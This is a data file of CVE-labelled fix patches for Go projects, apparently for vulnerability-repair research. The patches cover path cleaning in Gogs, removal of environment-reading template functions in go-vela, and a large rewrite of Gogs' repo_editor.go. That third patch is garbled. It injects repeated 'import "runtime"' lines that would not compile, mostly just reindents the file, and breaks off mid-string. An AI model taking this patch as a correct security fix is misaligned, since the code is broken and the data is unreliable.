{"cve":"CVE-2022-1992:0708", "fix_patch": "diff --git a/internal/pathutil/pathutil.go b/internal/pathutil/pathutil.go\nindex 6a7286e1..fd57cabb 100644\n--- a/internal/pathutil/pathutil.go\n+++ b/internal/pathutil/pathutil.go\n@@ -5,11 +5,15 @@\n package pathutil\n \n import (\n-\t\"path\"\n-\t\"strings\"\n+        \"path\"\n+        \"strings\"\n )\n \n // Clean cleans up given path and returns a relative path that goes straight down.\n func Clean(p string) string {\n-\treturn strings.Trim(path.Clean(\"/\"+p), \"/\")\n+cleaned := path.Clean(\"/\" + p)\n+if cleaned == \"/\" {\n+return \"\"\n+}\n+return strings.TrimPrefix(cleaned, \"/\")\n }\n"}
{"cve":"CVE-2020-26294:0708", "fix_patch": "diff --git a/template/native/render.go b/template/native/render.go\nindex 4683db6..efc9d51 100644\n--- a/template/native/render.go\n+++ b/template/native/render.go\n@@ -1,51 +1,51 @@\n package native\n \n import (\n-\t\"bytes\"\n-\t\"fmt\"\n-\t\"text/template\"\n+        \"bytes\"\n+        \"fmt\"\n+        \"text/template\"\n \n-\ttypes \"github.com/go-vela/types/yaml\"\n+        types \"github.com/go-vela/types/yaml\"\n \n-\t\"github.com/Masterminds/sprig\"\n+        \"github.com/go-vela/compiler/template/sprig\"\n \n-\tyaml \"gopkg.in/yaml.v2\"\n+        yaml \"gopkg.in/yaml.v2\"\n )\n \n // Render combines the template with the step in the yaml pipeline.\n func Render(tmpl string, s *types.Step) (types.StepSlice, error) {\n-\tbuffer := new(bytes.Buffer)\n-\tconfig := new(types.Build)\n-\n-\tvelaFuncs := funcHandler{envs: convertPlatformVars(s.Environment)}\n-\ttemplateFuncMap := map[string]interface{}{\n-\t\t\"vela\": velaFuncs.returnPlatformVar,\n-\t}\n-\n-\t// parse the template with Masterminds/sprig functions\n-\t//\n-\t// https://pkg.go.dev/github.com/Masterminds/sprig?tab=doc#TxtFuncMap\n-\tt, err := template.New(s.Name).Funcs(sprig.TxtFuncMap()).Funcs(templateFuncMap).Parse(tmpl)\n-\tif err != nil {\n-\t\treturn types.StepSlice{}, fmt.Errorf(\"unable to parse template %s: %v\", s.Template.Name, err)\n-\t}\n-\n-\t// apply the variables to the parsed template\n-\terr = t.Execute(buffer, s.Template.Variables)\n-\tif err != nil {\n-\t\treturn types.StepSlice{}, fmt.Errorf(\"unable to execute template %s: %v\", s.Template.Name, err)\n-\t}\n-\n-\t// unmarshal the template to the pipeline\n-\terr = yaml.Unmarshal(buffer.Bytes(), config)\n-\tif err != nil {\n-\t\treturn types.StepSlice{}, fmt.Errorf(\"unable to unmarshal yaml: %v\", err)\n-\t}\n-\n-\t// ensure all templated steps have template prefix\n-\tfor index, newStep := range config.Steps {\n-\t\tconfig.Steps[index].Name = fmt.Sprintf(\"%s_%s\", s.Name, newStep.Name)\n-\t}\n-\n-\treturn config.Steps, nil\n+        buffer := new(bytes.Buffer)\n+        config := new(types.Build)\n+\n+        velaFuncs := funcHandler{envs: convertPlatformVars(s.Environment)}\n+        templateFuncMap := map[string]interface{}{\n+                \"vela\": velaFuncs.returnPlatformVar,\n+        }\n+\n+        // parse the template with Masterminds/sprig functions\n+        //\n+        // https://pkg.go.dev/github.com/Masterminds/sprig?tab=doc#TxtFuncMap\n+        t, err := template.New(s.Name).Funcs(sprig.New()).Funcs(templateFuncMap).Parse(tmpl)\n+        if err != nil {\n+                return types.StepSlice{}, fmt.Errorf(\"unable to parse template %s: %v\", s.Template.Name, err)\n+        }\n+\n+        // apply the variables to the parsed template\n+        err = t.Execute(buffer, s.Template.Variables)\n+        if err != nil {\n+                return types.StepSlice{}, fmt.Errorf(\"unable to execute template %s: %v\", s.Template.Name, err)\n+        }\n+\n+        // unmarshal the template to the pipeline\n+        err = yaml.Unmarshal(buffer.Bytes(), config)\n+        if err != nil {\n+                return types.StepSlice{}, fmt.Errorf(\"unable to unmarshal yaml: %v\", err)\n+        }\n+\n+        // ensure all templated steps have template prefix\n+        for index, newStep := range config.Steps {\n+                config.Steps[index].Name = fmt.Sprintf(\"%s_%s\", s.Name, newStep.Name)\n+        }\n+\n+        return config.Steps, nil\n }\ndiff --git a/template/sprig/sprig.go b/template/sprig/sprig.go\nnew file mode 100644\nindex 0000000..f31104d\n--- /dev/null\n+++ b/template/sprig/sprig.go\n@@ -0,0 +1,20 @@\n+package sprig\n+\n+import (\n+\"text/template\"\n+\n+\"github.com/Masterminds/sprig\"\n+)\n+\n+// New returns a new text template function map.\n+func New() template.FuncMap {\n+f := make(template.FuncMap)\n+for k, v := range sprig.TxtFuncMap() {\n+f[k] = v\n+}\n+\n+delete(f, \"env\")\n+delete(f, \"expandenv\")\n+\n+return f\n+}\n\\ No newline at end of file\n"}
{"cve":"CVE-2022-1986:0708", "fix_patch": "diff --git a/internal/db/repo_editor.go b/internal/db/repo_editor.go\nindex 9d4664be..a2977e8f 100644\n--- a/internal/db/repo_editor.go\n+++ b/internal/db/repo_editor.go\n@@ -4,67 +4,78 @@\n \n package db\n \n+import \"runtime\"\n+import \"runtime\"\n+\n+import \"runtime\"\n+\n+import \"runtime\"\n+\n import (\n-\t\"fmt\"\n-\t\"io\"\n-\t\"io/ioutil\"\n-\t\"mime/multipart\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/pkg/errors\"\n-\tgouuid \"github.com/satori/go.uuid\"\n-\t\"github.com/unknwon/com\"\n-\n-\t\"github.com/gogs/git-module\"\n-\n-\t\"gogs.io/gogs/internal/conf\"\n-\t\"gogs.io/gogs/internal/cryptoutil\"\n-\tdberrors \"gogs.io/gogs/internal/db/errors\"\n-\t\"gogs.io/gogs/internal/gitutil\"\n-\t\"gogs.io/gogs/internal/osutil\"\n-\t\"gogs.io/gogs/internal/pathutil\"\n-\t\"gogs.io/gogs/internal/process\"\n-\t\"gogs.io/gogs/internal/tool\"\n+        \"fmt\"\n+        \"io\"\n+\"runtime\"\n+        \"io/ioutil\"\n+        \"mime/multipart\"\n+        \"os\"\n+        \"runtime\"\n+        \"os/exec\"\n+        \"path\"\n+        \"path/filepath\"\n+\"runtime\"\n+\"runtime\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/pkg/errors\"\n+        gouuid \"github.com/satori/go.uuid\"\n+        \"github.com/unknwon/com\"\n+\n+        \"github.com/gogs/git-module\"\n+\n+        \"gogs.io/gogs/internal/conf\"\n+        \"gogs.io/gogs/internal/cryptoutil\"\n+        dberrors \"gogs.io/gogs/internal/db/errors\"\n+        \"gogs.io/gogs/internal/gitutil\"\n+        \"gogs.io/gogs/internal/osutil\"\n+        \"gogs.io/gogs/internal/pathutil\"\n+        \"gogs.io/gogs/internal/process\"\n+        \"gogs.io/gogs/internal/tool\"\n )\n \n const (\n-\tENV_AUTH_USER_ID           = \"GOGS_AUTH_USER_ID\"\n-\tENV_AUTH_USER_NAME         = \"GOGS_AUTH_USER_NAME\"\n-\tENV_AUTH_USER_EMAIL        = \"GOGS_AUTH_USER_EMAIL\"\n-\tENV_REPO_OWNER_NAME        = \"GOGS_REPO_OWNER_NAME\"\n-\tENV_REPO_OWNER_SALT_MD5    = \"GOGS_REPO_OWNER_SALT_MD5\"\n-\tENV_REPO_ID                = \"GOGS_REPO_ID\"\n-\tENV_REPO_NAME              = \"GOGS_REPO_NAME\"\n-\tENV_REPO_CUSTOM_HOOKS_PATH = \"GOGS_REPO_CUSTOM_HOOKS_PATH\"\n+        ENV_AUTH_USER_ID           = \"GOGS_AUTH_USER_ID\"\n+        ENV_AUTH_USER_NAME         = \"GOGS_AUTH_USER_NAME\"\n+        ENV_AUTH_USER_EMAIL        = \"GOGS_AUTH_USER_EMAIL\"\n+        ENV_REPO_OWNER_NAME        = \"GOGS_REPO_OWNER_NAME\"\n+        ENV_REPO_OWNER_SALT_MD5    = \"GOGS_REPO_OWNER_SALT_MD5\"\n+        ENV_REPO_ID                = \"GOGS_REPO_ID\"\n+        ENV_REPO_NAME              = \"GOGS_REPO_NAME\"\n+        ENV_REPO_CUSTOM_HOOKS_PATH = \"GOGS_REPO_CUSTOM_HOOKS_PATH\"\n )\n \n type ComposeHookEnvsOptions struct {\n-\tAuthUser  *User\n-\tOwnerName string\n-\tOwnerSalt string\n-\tRepoID    int64\n-\tRepoName  string\n-\tRepoPath  string\n+        AuthUser  *User\n+        OwnerName string\n+        OwnerSalt string\n+        RepoID    int64\n+        RepoName  string\n+        RepoPath  string\n }\n \n func ComposeHookEnvs(opts ComposeHookEnvsOptions) []string {\n-\tenvs := []string{\n-\t\t\"SSH_ORIGINAL_COMMAND=1\",\n-\t\tENV_AUTH_USER_ID + \"=\" + com.ToStr(opts.AuthUser.ID),\n-\t\tENV_AUTH_USER_NAME + \"=\" + opts.AuthUser.Name,\n-\t\tENV_AUTH_USER_EMAIL + \"=\" + opts.AuthUser.Email,\n-\t\tENV_REPO_OWNER_NAME + \"=\" + opts.OwnerName,\n-\t\tENV_REPO_OWNER_SALT_MD5 + \"=\" + cryptoutil.MD5(opts.OwnerSalt),\n-\t\tENV_REPO_ID + \"=\" + com.ToStr(opts.RepoID),\n-\t\tENV_REPO_NAME + \"=\" + opts.RepoName,\n-\t\tENV_REPO_CUSTOM_HOOKS_PATH + \"=\" + filepath.Join(opts.RepoPath, \"custom_hooks\"),\n-\t}\n-\treturn envs\n+        envs := []string{\n+                \"SSH_ORIGINAL_COMMAND=1\",\n+                ENV_AUTH_USER_ID + \"=\" + com.ToStr(opts.AuthUser.ID),\n+                ENV_AUTH_USER_NAME + \"=\" + opts.AuthUser.Name,\n+                ENV_AUTH_USER_EMAIL + \"=\" + opts.AuthUser.Email,\n+                ENV_REPO_OWNER_NAME + \"=\" + opts.OwnerName,\n+                ENV_REPO_OWNER_SALT_MD5 + \"=\" + cryptoutil.MD5(opts.OwnerSalt),\n+                ENV_REPO_ID + \"=\" + com.ToStr(opts.RepoID),\n+                ENV_REPO_NAME + \"=\" + opts.RepoName,\n+                ENV_REPO_CUSTOM_HOOKS_PATH + \"=\" + filepath.Join(opts.RepoPath, \"custom_hooks\"),\n+        }\n+        return envs\n }\n \n // ___________    .___.__  __    ___________.__.__\n@@ -77,184 +88,184 @@ func ComposeHookEnvs(opts ComposeHookEnvsOptions) []string {\n // discardLocalRepoBranchChanges discards local commits/changes of\n // given branch to make sure it is even to remote branch.\n func discardLocalRepoBranchChanges(localPath, branch string) error {\n-\tif !com.IsExist(localPath) {\n-\t\treturn nil\n-\t}\n-\n-\t// No need to check if nothing in the repository.\n-\tif !git.RepoHasBranch(localPath, branch) {\n-\t\treturn nil\n-\t}\n-\n-\trev := \"origin/\" + branch\n-\tif err := git.Reset(localPath, rev, git.ResetOptions{Hard: true}); err != nil {\n-\t\treturn fmt.Errorf(\"reset [revision: %s]: %v\", rev, err)\n-\t}\n-\treturn nil\n+        if !com.IsExist(localPath) {\n+                return nil\n+        }\n+\n+        // No need to check if nothing in the repository.\n+        if !git.RepoHasBranch(localPath, branch) {\n+                return nil\n+        }\n+\n+        rev := \"origin/\" + branch\n+        if err := git.Reset(localPath, rev, git.ResetOptions{Hard: true}); err != nil {\n+                return fmt.Errorf(\"reset [revision: %s]: %v\", rev, err)\n+        }\n+        return nil\n }\n \n func (repo *Repository) DiscardLocalRepoBranchChanges(branch string) error {\n-\treturn discardLocalRepoBranchChanges(repo.LocalCopyPath(), branch)\n+        return discardLocalRepoBranchChanges(repo.LocalCopyPath(), branch)\n }\n \n // CheckoutNewBranch checks out to a new branch from the a branch name.\n func (repo *Repository) CheckoutNewBranch(oldBranch, newBranch string) error {\n-\tif err := git.Checkout(repo.LocalCopyPath(), newBranch, git.CheckoutOptions{\n-\t\tBaseBranch: oldBranch,\n-\t\tTimeout:    time.Duration(conf.Git.Timeout.Pull) * time.Second,\n-\t}); err != nil {\n-\t\treturn fmt.Errorf(\"checkout [base: %s, new: %s]: %v\", oldBranch, newBranch, err)\n-\t}\n-\treturn nil\n+        if err := git.Checkout(repo.LocalCopyPath(), newBranch, git.CheckoutOptions{\n+                BaseBranch: oldBranch,\n+                Timeout:    time.Duration(conf.Git.Timeout.Pull) * time.Second,\n+        }); err != nil {\n+                return fmt.Errorf(\"checkout [base: %s, new: %s]: %v\", oldBranch, newBranch, err)\n+        }\n+        return nil\n }\n \n type UpdateRepoFileOptions struct {\n-\tLastCommitID string\n-\tOldBranch    string\n-\tNewBranch    string\n-\tOldTreeName  string\n-\tNewTreeName  string\n-\tMessage      string\n-\tContent      string\n-\tIsNewFile    bool\n+        LastCommitID string\n+        OldBranch    string\n+        NewBranch    string\n+        OldTreeName  string\n+        NewTreeName  string\n+        Message      string\n+        Content      string\n+        IsNewFile    bool\n }\n \n // UpdateRepoFile adds or updates a file in repository.\n func (repo *Repository) UpdateRepoFile(doer *User, opts UpdateRepoFileOptions) (err error) {\n-\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\tif isRepositoryGitPath(opts.NewTreeName) {\n-\t\treturn errors.Errorf(\"bad tree path %q\", opts.NewTreeName)\n-\t}\n-\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\trepoPath := repo.RepoPath()\n-\tlocalPath := repo.LocalCopyPath()\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\t// Directly return error if new branch already exists in the server\n-\t\tif git.RepoHasBranch(repoPath, opts.NewBranch) {\n-\t\t\treturn dberrors.BranchAlreadyExists{Name: opts.NewBranch}\n-\t\t}\n-\n-\t\t// Otherwise, delete branch from local copy in case out of sync\n-\t\tif git.RepoHasBranch(localPath, opts.NewBranch) {\n-\t\t\tif err = git.DeleteBranch(localPath, opts.NewBranch, git.DeleteBranchOptions{\n-\t\t\t\tForce: true,\n-\t\t\t}); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"delete branch %q: %v\", opts.NewBranch, err)\n-\t\t\t}\n-\t\t}\n-\n-\t\tif err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\toldFilePath := path.Join(localPath, opts.OldTreeName)\n-\tfilePath := path.Join(localPath, opts.NewTreeName)\n-\tif err = os.MkdirAll(path.Dir(filePath), os.ModePerm); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// If it's meant to be a new file, make sure it doesn't exist.\n-\tif opts.IsNewFile {\n-\t\tif com.IsExist(filePath) {\n-\t\t\treturn ErrRepoFileAlreadyExist{filePath}\n-\t\t}\n-\t}\n-\n-\t// Ignore move step if it's a new file under a directory.\n-\t// Otherwise, move the file when name changed.\n-\tif osutil.IsFile(oldFilePath) && opts.OldTreeName != opts.NewTreeName {\n-\t\tif err = git.Move(localPath, opts.OldTreeName, opts.NewTreeName); err != nil {\n-\t\t\treturn fmt.Errorf(\"git mv %q %q: %v\", opts.OldTreeName, opts.NewTreeName, err)\n-\t\t}\n-\t}\n-\n-\tif err = ioutil.WriteFile(filePath, []byte(opts.Content), 0666); err != nil {\n-\t\treturn fmt.Errorf(\"write file: %v\", err)\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t} else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n-\t\treturn fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\treturn nil\n+        // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+        if isRepositoryGitPath(opts.NewTreeName) {\n+                return errors.Errorf(\"bad tree path %q\", opts.NewTreeName)\n+        }\n+\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        repoPath := repo.RepoPath()\n+        localPath := repo.LocalCopyPath()\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                // Directly return error if new branch already exists in the server\n+                if git.RepoHasBranch(repoPath, opts.NewBranch) {\n+                        return dberrors.BranchAlreadyExists{Name: opts.NewBranch}\n+                }\n+\n+                // Otherwise, delete branch from local copy in case out of sync\n+                if git.RepoHasBranch(localPath, opts.NewBranch) {\n+                        if err = git.DeleteBranch(localPath, opts.NewBranch, git.DeleteBranchOptions{\n+                                Force: true,\n+                        }); err != nil {\n+                                return fmt.Errorf(\"delete branch %q: %v\", opts.NewBranch, err)\n+                        }\n+                }\n+\n+                if err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        oldFilePath := path.Join(localPath, opts.OldTreeName)\n+        filePath := path.Join(localPath, opts.NewTreeName)\n+        if err = os.MkdirAll(path.Dir(filePath), os.ModePerm); err != nil {\n+                return err\n+        }\n+\n+        // If it's meant to be a new file, make sure it doesn't exist.\n+        if opts.IsNewFile {\n+                if com.IsExist(filePath) {\n+                        return ErrRepoFileAlreadyExist{filePath}\n+                }\n+        }\n+\n+        // Ignore move step if it's a new file under a directory.\n+        // Otherwise, move the file when name changed.\n+        if osutil.IsFile(oldFilePath) && opts.OldTreeName != opts.NewTreeName {\n+                if err = git.Move(localPath, opts.OldTreeName, opts.NewTreeName); err != nil {\n+                        return fmt.Errorf(\"git mv %q %q: %v\", opts.OldTreeName, opts.NewTreeName, err)\n+                }\n+        }\n+\n+        if err = ioutil.WriteFile(filePath, []byte(opts.Content), 0666); err != nil {\n+                return fmt.Errorf(\"write file: %v\", err)\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        } else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n+                return fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+        return nil\n }\n \n // GetDiffPreview produces and returns diff result of a file which is not yet committed.\n func (repo *Repository) GetDiffPreview(branch, treePath, content string) (diff *gitutil.Diff, err error) {\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(branch); err != nil {\n-\t\treturn nil, fmt.Errorf(\"discard local repo branch[%s] changes: %v\", branch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(branch); err != nil {\n-\t\treturn nil, fmt.Errorf(\"update local copy branch[%s]: %v\", branch, err)\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tfilePath := path.Join(localPath, treePath)\n-\tif err = os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif err = ioutil.WriteFile(filePath, []byte(content), 0666); err != nil {\n-\t\treturn nil, fmt.Errorf(\"write file: %v\", err)\n-\t}\n-\n-\tcmd := exec.Command(\"git\", \"diff\", treePath)\n-\tcmd.Dir = localPath\n-\tcmd.Stderr = os.Stderr\n-\n-\tstdout, err := cmd.StdoutPipe()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"get stdout pipe: %v\", err)\n-\t}\n-\n-\tif err = cmd.Start(); err != nil {\n-\t\treturn nil, fmt.Errorf(\"start: %v\", err)\n-\t}\n-\n-\tpid := process.Add(fmt.Sprintf(\"GetDiffPreview [repo_path: %s]\", repo.RepoPath()), cmd)\n-\tdefer process.Remove(pid)\n-\n-\tdiff, err = gitutil.ParseDiff(stdout, conf.Git.MaxDiffFiles, conf.Git.MaxDiffLines, conf.Git.MaxDiffLineChars)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"parse diff: %v\", err)\n-\t}\n-\n-\tif err = cmd.Wait(); err != nil {\n-\t\treturn nil, fmt.Errorf(\"wait: %v\", err)\n-\t}\n-\n-\treturn diff, nil\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(branch); err != nil {\n+                return nil, fmt.Errorf(\"discard local repo branch[%s] changes: %v\", branch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(branch); err != nil {\n+                return nil, fmt.Errorf(\"update local copy branch[%s]: %v\", branch, err)\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        filePath := path.Join(localPath, treePath)\n+        if err = os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {\n+                return nil, err\n+        }\n+        if err = ioutil.WriteFile(filePath, []byte(content), 0666); err != nil {\n+                return nil, fmt.Errorf(\"write file: %v\", err)\n+        }\n+\n+        cmd := exec.Command(\"git\", \"diff\", treePath)\n+        cmd.Dir = localPath\n+        cmd.Stderr = os.Stderr\n+\n+        stdout, err := cmd.StdoutPipe()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"get stdout pipe: %v\", err)\n+        }\n+\n+        if err = cmd.Start(); err != nil {\n+                return nil, fmt.Errorf(\"start: %v\", err)\n+        }\n+\n+        pid := process.Add(fmt.Sprintf(\"GetDiffPreview [repo_path: %s]\", repo.RepoPath()), cmd)\n+        defer process.Remove(pid)\n+\n+        diff, err = gitutil.ParseDiff(stdout, conf.Git.MaxDiffFiles, conf.Git.MaxDiffLines, conf.Git.MaxDiffLineChars)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"parse diff: %v\", err)\n+        }\n+\n+        if err = cmd.Wait(); err != nil {\n+                return nil, fmt.Errorf(\"wait: %v\", err)\n+        }\n+\n+        return diff, nil\n }\n \n // ________         .__          __           ___________.__.__\n@@ -266,58 +277,58 @@ func (repo *Repository) GetDiffPreview(branch, treePath, content string) (diff *\n //\n \n type DeleteRepoFileOptions struct {\n-\tLastCommitID string\n-\tOldBranch    string\n-\tNewBranch    string\n-\tTreePath     string\n-\tMessage      string\n+        LastCommitID string\n+        OldBranch    string\n+        NewBranch    string\n+        TreePath     string\n+        Message      string\n }\n \n func (repo *Repository) DeleteRepoFile(doer *User, opts DeleteRepoFileOptions) (err error) {\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\tif err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tif err = os.Remove(path.Join(localPath, opts.TreePath)); err != nil {\n-\t\treturn fmt.Errorf(\"remove file %q: %v\", opts.TreePath, err)\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t} else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n-\t\treturn fmt.Errorf(\"commit changes to %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\treturn nil\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                if err := repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        if err = os.Remove(path.Join(localPath, opts.TreePath)); err != nil {\n+                return fmt.Errorf(\"remove file %q: %v\", opts.TreePath, err)\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        } else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n+                return fmt.Errorf(\"commit changes to %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+        return nil\n }\n \n //  ____ ___        .__                    .___ ___________.___.__\n@@ -330,228 +341,243 @@ func (repo *Repository) DeleteRepoFile(doer *User, opts DeleteRepoFileOptions) (\n \n // Upload represent a uploaded file to a repo to be deleted when moved\n type Upload struct {\n-\tID   int64\n-\tUUID string `xorm:\"uuid UNIQUE\"`\n-\tName string\n+        ID   int64\n+        UUID string `xorm:\"uuid UNIQUE\"`\n+        Name string\n }\n \n // UploadLocalPath returns where uploads is stored in local file system based on given UUID.\n func UploadLocalPath(uuid string) string {\n-\treturn path.Join(conf.Repository.Upload.TempPath, uuid[0:1], uuid[1:2], uuid)\n+        return path.Join(conf.Repository.Upload.TempPath, uuid[0:1], uuid[1:2], uuid)\n }\n \n // LocalPath returns where uploads are temporarily stored in local file system.\n func (upload *Upload) LocalPath() string {\n-\treturn UploadLocalPath(upload.UUID)\n+        return UploadLocalPath(upload.UUID)\n }\n \n // NewUpload creates a new upload object.\n func NewUpload(name string, buf []byte, file multipart.File) (_ *Upload, err error) {\n-\tif tool.IsMaliciousPath(name) {\n-\t\treturn nil, fmt.Errorf(\"malicious path detected: %s\", name)\n-\t}\n-\n-\tupload := &Upload{\n-\t\tUUID: gouuid.NewV4().String(),\n-\t\tName: name,\n-\t}\n-\n-\tlocalPath := upload.LocalPath()\n-\tif err = os.MkdirAll(path.Dir(localPath), os.ModePerm); err != nil {\n-\t\treturn nil, fmt.Errorf(\"mkdir all: 